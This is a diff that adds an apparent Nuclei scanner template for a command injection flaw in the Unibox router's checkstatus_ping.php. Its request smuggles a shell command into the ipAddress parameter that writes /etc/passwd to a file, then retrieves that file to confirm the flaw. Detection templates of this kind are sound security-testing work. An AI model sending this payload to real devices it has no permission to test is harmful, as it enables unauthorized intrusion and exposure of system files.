@@ -1,0 +1,46 @@
+id: unibox-router-checkstatus-ping-php-command-injection
+info:
+  name: Unibox Router checkstatus_ping.php Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  description: |
+    Unibox router checkstatus_ping.php command injection vulnerability allows arbitrary system command execution.
+
+variables:
+  random_filename: "{{rand_base(5)}}.txt"
+
+http:
+  - id: execute-command
+    method: GET
+    path:
+      - "{{BaseURL}}/network/checkstatus_ping.php?ipAddress=;cat%20/etc/passwd>{{random_filename}};"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "statusdate"
+
+  - id: retrieve-output
+    method: GET
+    path:
+      - "{{BaseURL}}/network/{{random_filename}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
